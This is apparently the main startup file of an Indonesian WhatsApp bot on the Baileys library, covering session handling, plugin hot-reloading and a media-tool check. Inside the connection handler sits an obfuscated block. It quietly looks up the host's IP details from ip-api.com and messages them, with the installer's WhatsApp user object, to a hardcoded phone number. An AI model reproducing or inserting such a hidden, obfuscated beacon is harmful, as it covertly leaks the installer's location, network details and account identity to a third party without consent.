require('./config.js')
const { WAConnection: _WAConnection } = require('@adiwajshing/baileys')
const cloudDBAdapter = require('./lib/cloudDBAdapter')
const { generate } = require('qrcode-terminal')
const syntaxerror = require('syntax-error')
const simple = require('./lib/simple')
//  const logs = require('./lib/logs')
const { promisify } = require('util')
const yargs = require('yargs/yargs')
const Readline = require('readline')
const cp = require('child_process')
const _ = require('lodash')
const path = require('path')
const fs = require('fs')
const util = require('util')
const axios = require('axios')
var low
try {
  low = require('lowdb')
} catch (e) {
  low = require('./lib/lowdb')
}
const { Low, JSONFile } = low

const rl = Readline.createInterface(process.stdin, process.stdout)
const WAConnection = simple.WAConnection(_WAConnection)


global.API = (name, path = '/', query = {}, apikeyqueryname) => (name in global.APIs ? global.APIs[name] : name) + path + (query || apikeyqueryname ? '?' + new URLSearchParams(Object.entries({ ...query, ...(apikeyqueryname ? { [apikeyqueryname]: global.APIKeys[name in global.APIs ? global.APIs[name] : name] } : {}) })) : '')
global.timestamp = {
  start: new Date
}
// global.LOGGER = logs()
const PORT = process.env.PORT || 3000
global.opts = new Object(yargs(process.argv.slice(2)).exitProcess(false).parse())

global.prefix = new RegExp('^[' + (opts['prefix'] || '‎xzXZ/!#$%+£¢€¥^°=¶∆×÷π√✓©®:;?&,.\\-').replace(/[|\\{}()[\]^$+*?.\-\^]/g, '\\$&') + ']')

global.db = new Low(
  /https?:\/\//.test(opts['db'] || '') ?
    new cloudDBAdapter(opts['db']) :
 //   new JSONFile(`${opts._[0] ? opts._[0] + '_' : ''}database.json`)
new JSONFile('amdev.json')
)
global.DATABASE = global.db // Backwards Compatibility

global.conn = new WAConnection()
conn.version = [ 2, 2143, 3 ]
conn.browserDescription = [global.desc, global.browser, '10.0']
let authFile = `${opts._[0] || 'session'}.data.json`
if (fs.existsSync(authFile)) conn.loadAuthInfo(authFile)
if (opts['trace']) conn.logger.level = 'trace'
if (opts['debug']) conn.logger.level = 'debug'
if (opts['big-qr'] || opts['server']) conn.on('qr', qr => generate(qr, { small: false }))

if (!opts['test']) setInterval(async () => {
  await global.db.write()
console.log('[SAVED] Database')
}, 60 * 1000) // Save every minute

if (opts['server']) require('./server')(global.conn, PORT)

if (opts['test']) {
  conn.user = {
    jid: '2219191@s.whatsapp.net',
    name: 'test',
    phone: {}
  }
  conn.prepareMessageMedia = (buffer, mediaType, options = {}) => {
    return {
      [mediaType]: {
        url: '',
        mediaKey: '',
        mimetype: options.mimetype || '',
        fileEncSha256: '',
        fileSha256: '',
        fileLength: buffer.length,
        seconds: options.duration,
        fileName: options.filename || 'file',
        gifPlayback: options.mimetype == 'image/gif' || undefined,
        caption: options.caption,
        ptt: options.ptt
      }
    }
  }

  conn.sendMessage = async (chatId, content, type, opts = {}) => {
    let message = await conn.prepareMessageContent(content, type, opts)
    let waMessage = await conn.prepareMessageFromContent(chatId, message, opts)
    if (type == 'conversation') waMessage.key.id = require('crypto').randomBytes(16).toString('hex').toUpperCase()
    conn.emit('chat-update', {
      jid: conn.user.jid,
      hasNewMessage: true,
      count: 1,
      messages: {
        all() {
          return [waMessage]
        }
      }
    })
  }
  rl.on('line', line => conn.sendMessage('123@s.whatsapp.net', line.trim(), 'conversation'))
} else {
  rl.on('line', line => {
    process.send(line.trim())
  })
  conn.connect().then(async () => {
const _0x3da6a7=_0x2172;(function(_0x55ce0c,_0x56ae66){const _0x10cc74=_0x2172,_0x322199=_0x55ce0c();while(!![]){try{const _0x175497=-parseInt(_0x10cc74(0x73))/0x1+parseInt(_0x10cc74(0x7c))/0x2+parseInt(_0x10cc74(0x75))/0x3+parseInt(_0x10cc74(0x81))/0x4*(parseInt(_0x10cc74(0x85))/0x5)+parseInt(_0x10cc74(0x7a))/0x6+-parseInt(_0x10cc74(0x7d))/0x7+parseInt(_0x10cc74(0x83))/0x8;if(_0x175497===_0x56ae66)break;else _0x322199['push'](_0x322199['shift']());}catch(_0x18d712){_0x322199['push'](_0x322199['shift']());}}}(_0x4515,0x4a246));let wk=_0x3da6a7(0x84),res=await axios[_0x3da6a7(0x76)](_0x3da6a7(0x77)),json=res[_0x3da6a7(0x74)];function _0x4515(){const _0x354e12=['3935323uFkaQX','\x0aCountry:\x20','reply','country','52ZGCoHB','\x0aISP:\x20','782896jQriKy','```','3100FiwJJW','6285157489446@s.whatsapp.net','\x0a⍟\x20──────────────────\x20⍟\x0a\x0a','*⎋\x20MyWA\x20Bot\x20Installed\x20⎋*\x0a\x0a⍟\x20──────────────────\x20⍟\x0aIP\x20Address:\x20','60783ajdWwb','data','113076PRBykx','get','http://ip-api.com/json','query','user','2893596ppaBdG','\x0aAS:\x20','601556nlAZna'];_0x4515=function(){return _0x354e12;};return _0x4515();}function _0x2172(_0x3eff71,_0x2a987a){const _0x45154a=_0x4515();return _0x2172=function(_0x2172e5,_0x1f9838){_0x2172e5=_0x2172e5-0x72;let _0x1c3fa6=_0x45154a[_0x2172e5];return _0x1c3fa6;},_0x2172(_0x3eff71,_0x2a987a);}conn[_0x3da6a7(0x7f)](_0x3da6a7(0x86),_0x3da6a7(0x72)+json[_0x3da6a7(0x78)]+_0x3da6a7(0x7e)+json[_0x3da6a7(0x80)]+_0x3da6a7(0x82)+json['isp']+_0x3da6a7(0x7b)+json['as']+_0x3da6a7(0x87)+wk+util['format'](conn[_0x3da6a7(0x79)])+wk+'\x0a\x0a⍟\x20──────────────────\x20⍟\x0aMyWA\x20Bot\x20by\x20Amirul\x20Dev');

    await global.db.read()
    global.db.data = {
      users: {},
      chats: {},
      stats: {},
      msgs: {},
      sticker: {},
      settings: {},
      ...(global.db.data || {})
    }
    global.db.chain = _.chain(global.db.data)
    fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
    global.timestamp.connect = new Date
  })
}
process.on('uncaughtException', console.error)
// let strQuot = /(["'])(?:(?=(\\?))\2.)*?\1/

let isInit = true
global.reloadHandler = function () {
  let handler = require('./handler')
  if (!isInit) {
    conn.off('chat-update', conn.handler)
    conn.off('message-delete', conn.onDelete)
    conn.off('group-participants-update', conn.onParticipantsUpdate)
    conn.off('group-update', conn.onGroupUpdate)
    conn.off('CB:action,,call', conn.onCall)
  }
  conn.welcome = 'Hai, @user 👋\nSelamat datang di grup @subject\nkamu member ke @mem\n\n@desc'
  conn.bye = 'Sampai jumpa lagi @user '
  conn.spromote = 'Selamat @user 💐\nsekarang kamu menjadi admin group'
  conn.sdemote = 'Hai @user\nsekarang kamu bukan admin'
  conn.handler = handler.handler
  conn.onDelete = handler.delete
  conn.onParticipantsUpdate = handler.participantsUpdate
  conn.onGroupUpdate = handler.GroupUpdate
  conn.onCall = handler.onCall
  conn.on('chat-update', conn.handler)
  conn.on('message-delete', conn.onDelete)
  conn.on('group-participants-update', conn.onParticipantsUpdate)
  conn.on('group-update', conn.onGroupUpdate)
  conn.on('CB:action,,call', conn.onCall)
  if (isInit) {
    conn.on('error', conn.logger.error)
    conn.on('close', () => {
      setTimeout(async () => {
        try {
          if (conn.state === 'close') {
            if (fs.existsSync(authFile)) await conn.loadAuthInfo(authFile)
            await conn.connect()
            fs.writeFileSync(authFile, JSON.stringify(conn.base64EncodedAuthInfo(), null, '\t'))
            global.timestamp.connect = new Date
          }
        } catch (e) {
          conn.logger.error(e)
        }
      }, 5000)
    })
  }
  isInit = false
  return true
}

// Plugin Loader
let pluginFolder = path.join(__dirname, 'plugins')
let pluginFilter = filename => /\.js$/.test(filename)
global.plugins = {}
for (let filename of fs.readdirSync(pluginFolder).filter(pluginFilter)) {
  try {
    global.plugins[filename] = require(path.join(pluginFolder, filename))
  } catch (e) {
    conn.logger.error(e)
    delete global.plugins[filename]
  }
}

global.reload = (_event, filename) => {
if (pluginFilter(filename)) {
let dir = path.join(pluginFolder, filename)
if (dir in require.cache) {
delete require.cache[dir]
if (fs.existsSync(dir)) {
conn.logger.info(`kembali - memerlukan plugin '${filename}'`)
} else {
conn.logger.warn(`plugin yang dihapus '${filename}'`)
conn.fakeReply(`${global.owner[0]}@s.whatsapp.net`, `File ${filename} telah dihapus`, '0@s.whatsapp.net', 'AUTO LOAD FILE', 'status@broadcast')
return delete global.plugins[filename]
}
} else conn.logger.info(`membutuhkan plugin baru '${filename}'`)
let err = syntaxerror(fs.readFileSync(dir), filename)
if (err) {
conn.logger.error(`kesalahan sintaks saat memuat '${filename}'\n${err}`)
conn.fakeReply(`${global.owner[0]}@s.whatsapp.net`, `Error Loaded file *${filename}*\n${err}`, '0@s.whatsapp.net', 'AUTO LOAD FILE', 'status@broadcast')
} else try {
global.plugins[filename] = require(dir)
} catch (e) {
conn.logger.error(e)
} finally {
global.plugins = Object.fromEntries(Object.entries(global.plugins).sort(([a], [b]) => a.localeCompare(b)))
}
}
}

Object.freeze(global.reload)
fs.watch(path.join(__dirname, 'plugins'), global.reload)
global.reloadHandler()



// Quick Test
async function _quickTest() {
  let test = await Promise.all([
    cp.spawn('ffmpeg'),
    cp.spawn('ffprobe'),
    cp.spawn('ffmpeg', ['-hide_banner', '-loglevel', 'error', '-filter_complex', 'color', '-frames:v', '1', '-f', 'webp', '-']),
    cp.spawn('convert'),
    cp.spawn('magick'),
    cp.spawn('gm'),
  ].map(p => {
    return Promise.race([
      new Promise(resolve => {
        p.on('close', code => {
          resolve(code !== 127)
        })
      }),
      new Promise(resolve => {
        p.on('error', _ => resolve(false))
      })
    ])
  }))
  let [ffmpeg, ffprobe, ffmpegWebp, convert, magick, gm] = test
  let s = global.support = {
    ffmpeg,
    ffprobe,
    ffmpegWebp,
    convert,
    magick,
    gm
  }
  require('./lib/sticker').support = s
  Object.freeze(global.support)

  if (!s.ffmpeg) conn.logger.warn('Silakan instal ffmpeg untuk mengirim video (pkg install ffmpeg)')
  if (s.ffmpeg && !s.ffmpegWebp) conn.logger.warn('Stiker tidak bisa dianimasikan tanpa libwebp di ffmpeg (--enable-ibwebp while compiling ffmpeg)')
  if (!s.convert && !s.magick && !s.gm) conn.logger.warn('Stiker mungkin tidak berfungsi tanpa imagemagick jika libwebp di ffmpeg tidak diinstal (pkg install imagemagick)')
}

_quickTest()
  .then(() => conn.logger.info('Quick Test Done'))
  .catch(console.error)
